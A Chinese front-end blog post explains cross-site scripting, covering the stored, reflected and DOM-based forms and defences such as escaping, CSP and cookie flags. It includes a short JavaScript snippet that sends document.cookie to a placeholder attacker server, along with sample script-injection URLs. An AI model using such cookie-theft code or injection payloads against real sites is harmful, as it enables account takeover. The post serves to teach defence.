
# XSS 是什么？

大家好，我是前端西瓜哥。今天我们来了解一下 XSS 攻击。

XSS 是什么？
--------

XSS，指的是**跨站脚本攻击**，是 Cross-site scripting 的缩写。

全称缩写后应该是 CSS，但这样就和 层叠样式表 Cascading Style Sheets 的缩写相同了，为以示区分，改用 XSS。

XSS，**本质是代码注入**。通过某种方式在受攻击网站中注入一些恶意代码，当用户访问该网站去触发这段脚本。

攻击的内容大致有以下几种：

1.  **获取用户的登录凭证，拿到后登录用户账号盗取敏感信息**
    

```js
const img = new Image();
img.src = 攻击者的服务器_ip + document.cookie;
document.body.append(img);
```

2.  **直接去执行一些需要权限才能进行的操作，比如给站内的某人投一票**。
    
3.  **对小网站做 Dos 攻击**。所谓 Dos 就是通过短时间大量的请求让网站无法处理过来，导致网站不可用。比如你在百度首页成功注入了恶意脚本，该脚本会对某个小网站不断发送请求。这样同时大量用户打开百度首页，这请求量就就非常恐怖，小网站直接嗝屁。
    

XSS 分类
------

XSS 主要分为：存储型 XSS、反射型 XSS、以及注入型 XSS。

### 存储型 XSS

恶意脚本被持久化保存在数据库中。

比如在自己的个人介绍的文本内容中，使用了 `<script>// 这里是一些恶意代码</script>`。当用户访问攻击者的个人主页时，如果服务端渲染时就会用上这段数据，没有做特别的转义处理，渲染出来的 HTML 中就带上了这个脚本，然后执行。

### 反射型 XSS

有些网页会将 url 中的一些数据作为渲染的内容去渲染。

比如我们希望用户支付完订单后跳转到一个结果页，这个页面通过 url 中的 query 字符串来显示一些内容，比如`http://a.com/order?message=成功` ，我们会读取 message 的值 “成功”，将这个文案渲染到页面上。

如果这个 “成功” 被黑客替换为恶意脚本，变成 `http://a.com/order?message=<script>// 恶意脚本内容</script>`，且网站没做转义处理，那这个恶意脚本就会被嵌入执行。

当然这个链接很奇怪，用户在常规情况下无法访问到这样的链接。

所以攻击者就需要先组装好，然后通过一些方式诱导用户去访问它，比如通过钓鱼邮件诱导点击。

### DOM 型 XSS

DOM 型 XSS 和反射型有点类似，但它和后端无关，是前端的问题。

前面两种类型做的是后端渲染，即用户请求 HTML 时，在服务端拼装返回完整的 HTML 返回。

DOM 型 XSS 是服务端没有返回完整的 HTML，而是让前端做拼装渲染，如果没有做特殊处理，也会导致恶意代码注入。

XSS 防御
------

1.  不要相信用户的数据；
    
2.  使用转义，常见的是将 `"'&<>` 做转义。比如 React 对字符做了防 XSS 处理，[源码](https://github.com/facebook/react/blob/HEAD/packages/react-dom/src/server/escapeTextForBrowser.js#L51)。
    
3.  如果做的是后端渲染，也记得做转义处理或过滤处理；
    
4.  使用 CSP（内容安全策略）。Twitter 网站使用了这个；
    
5.  对敏感 cookie 设置 http-only，让前端脚本无法获取到；
    
6.  cookie 的 SameSite 属性考虑调整为 Strict 或 Lax，让跨域 HTTP 请求的头字段无法自动携带 cookie；
    
7.  进行敏感请求时，加个验证码校验；
    
8.  控制内容输入长度（作用不大）；
    

结尾
--

XSS 攻击是一种比较常见的代码注入攻击。

在平时写代码时，要注意一些数据进行渲染时，会不会导致 XSS 注入的风险，做一些必要的处理，希望这篇文章对你有一些帮助。

我是前端西瓜哥，欢迎关注我，学习更多前端知识。

> 文章首发于我的公众号：前端西瓜哥